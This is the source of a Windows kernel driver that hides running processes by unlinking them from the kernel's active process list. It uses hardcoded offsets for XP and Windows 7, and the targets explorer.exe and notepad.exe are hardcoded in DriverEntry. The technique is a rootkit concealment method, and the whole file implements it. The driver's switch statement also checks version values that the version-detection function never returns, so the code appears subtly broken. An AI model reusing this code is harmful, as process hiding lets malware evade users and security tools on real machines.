#ifndef CXX_HIDEPROCESS_H
#	include "HideProcess.h"
#endif

ULONG_PTR ActiveOffsetPre =  0;
ULONG_PTR ActiveOffsetNext = 0;
ULONG_PTR ImageName = 0; 
WIN_VERSION WinVersion = WINDOWS_UNKNOW;

NTSTATUS
DriverEntry(IN PDRIVER_OBJECT DriverObject, IN PUNICODE_STRING RegisterPath)
{
	DbgPrint("DriverEntry\r\n");

	DriverObject->DriverUnload = UnloadDriver;

	WinVersion = GetWindowsVersion();

    switch(WinVersion)
	{
#ifdef _WIN32
	case WINDOWS_XP:   //32Bits
		{

			ActiveOffsetPre =  0x8c;
			ActiveOffsetNext = 0x88;
			ImageName = 0x174; 
			break;
		}
#else
	case WINDOWS_7:   //64Bits 
		{
			ActiveOffsetPre =  0x190;
			ActiveOffsetNext = 0x188;
			ImageName = 0x2e0; 
			break;
		}
#endif
	default:
		return STATUS_NOT_SUPPORTED;
	}

	HideProcess("explorer.exe");
	HideProcess("notepad.exe");
	return STATUS_SUCCESS;
}

VOID HideProcess(char* ProcessName)
{
	PEPROCESS CurrentProcess = NULL;
	PEPROCESS PreProcess = NULL;
	PLIST_ENTRY Temp = NULL;

	if(!ProcessName)
		return;

	CurrentProcess = PsGetCurrentProcess();    //System  EProcess
	PreProcess = (PEPROCESS)((ULONG_PTR)(*((ULONG_PTR*)((ULONG_PTR)CurrentProcess + ActiveOffsetPre))) - ActiveOffsetNext); 

	while (CurrentProcess != PreProcess)
	{
	    //DbgPrint("%s\r\n",(char*)((ULONG_PTR)CurrentProcess + ImageName));
		if(strcmp((char*)((ULONG_PTR)CurrentProcess + ImageName), ProcessName) == 0)
		{
			Temp = (PLIST_ENTRY)((ULONG_PTR)CurrentProcess + ActiveOffsetNext);

			if (MmIsAddressValid(Temp))
			{
				RemoveEntryList(Temp);		
			}
			break;
		}
		
		CurrentProcess = (PEPROCESS)((ULONG_PTR)(*((ULONG_PTR*)((ULONG_PTR)CurrentProcess + ActiveOffsetNext))) - ActiveOffsetNext);
	}
}

VOID UnloadDriver(PDRIVER_OBJECT  DriverObject)
{
	DbgPrint("UnloadDriver\r\n");
}

WIN_VERSION GetWindowsVersion()
{
	RTL_OSVERSIONINFOEXW osverInfo = {sizeof(osverInfo)}; 
	pfnRtlGetVersion RtlGetVersion = NULL;
	WIN_VERSION WinVersion;
	WCHAR szRtlGetVersion[] = L"RtlGetVersion";

	RtlGetVersion = (pfnRtlGetVersion)GetFunctionAddressByName(szRtlGetVersion); 

	if (RtlGetVersion)
	{
		RtlGetVersion((PRTL_OSVERSIONINFOW)&osverInfo); 
	} 
	else 
	{
		PsGetVersion(&osverInfo.dwMajorVersion, &osverInfo.dwMinorVersion, &osverInfo.dwBuildNumber, NULL);
	}

	//x64位支持
	if(osverInfo.dwMajorVersion == 6 && osverInfo.dwMinorVersion == 1 && osverInfo.dwBuildNumber == 7600)
	{
		DbgPrint("WINDOWS 7\r\n");
		WinVersion = WINDOWS_7_7600;
	}
	else if(osverInfo.dwMajorVersion == 6 && osverInfo.dwMinorVersion == 1 && osverInfo.dwBuildNumber == 7601)
	{
		DbgPrint("WINDOWS 7\r\n");
		WinVersion = WINDOWS_7_7601;
	}
	else if(osverInfo.dwMajorVersion == 6 && osverInfo.dwMinorVersion == 2 && osverInfo.dwBuildNumber == 9200)
	{
		DbgPrint("WINDOWS 8\r\n");
		WinVersion = WINDOWS_8_9200;
	}
	else if(osverInfo.dwMajorVersion == 6 && osverInfo.dwMinorVersion == 3 && osverInfo.dwBuildNumber == 9600)
	{
		DbgPrint("WINDOWS 8.1\r\n");
		WinVersion = WINDOWS_8_9600;
	}
	else if(osverInfo.dwMajorVersion == 10 && osverInfo.dwMinorVersion == 0 && osverInfo.dwBuildNumber == 10240)
	{
		DbgPrint("WINDOWS 10 10240\r\n");
		WinVersion = WINDOWS_10_10240;
	}
	else if(osverInfo.dwMajorVersion == 10 && osverInfo.dwMinorVersion == 0 && osverInfo.dwBuildNumber == 10586)
	{
		DbgPrint("WINDOWS 10 10586\r\n");
		WinVersion = WINDOWS_10_10586;
	}
	else if(osverInfo.dwMajorVersion == 10 && osverInfo.dwMinorVersion == 0 && osverInfo.dwBuildNumber == 14393)
	{
		DbgPrint("WINDOWS 10 14393\r\n");
		WinVersion = WINDOWS_10_14393;
	}
	else if(osverInfo.dwMajorVersion == 10 && osverInfo.dwMinorVersion == 0 && osverInfo.dwBuildNumber == 15063)
	{
		DbgPrint("WINDOWS 10 15063\r\n");
		WinVersion = WINDOWS_10_15063;
	}
	else if(osverInfo.dwMajorVersion == 10 && osverInfo.dwMinorVersion == 0 && osverInfo.dwBuildNumber == 16299)
	{
		DbgPrint("WINDOWS 10 16299\r\n");
		WinVersion = WINDOWS_10_16299;
	}
	else if(osverInfo.dwMajorVersion == 10 && osverInfo.dwMinorVersion == 0 && osverInfo.dwBuildNumber == 17134)
	{
		DbgPrint("WINDOWS 10 17134\r\n");
		WinVersion = WINDOWS_10_17134;
	}
	else
	{
		DbgPrint("This is a new os\r\n");
		WinVersion = WINDOWS_UNKNOW;
	}

	return WinVersion;
}

PVOID 
GetFunctionAddressByName(WCHAR *wzFunction)
{
	UNICODE_STRING uniFunction;  
	PVOID AddrBase = NULL;

	if (wzFunction && wcslen(wzFunction) > 0)
	{
		RtlInitUnicodeString(&uniFunction, wzFunction);      //常量指针
		AddrBase = MmGetSystemRoutineAddress(&uniFunction);  //在System 进程  第一个模块  Ntosknrl.exe  ExportTable
	}

	return AddrBase;
}

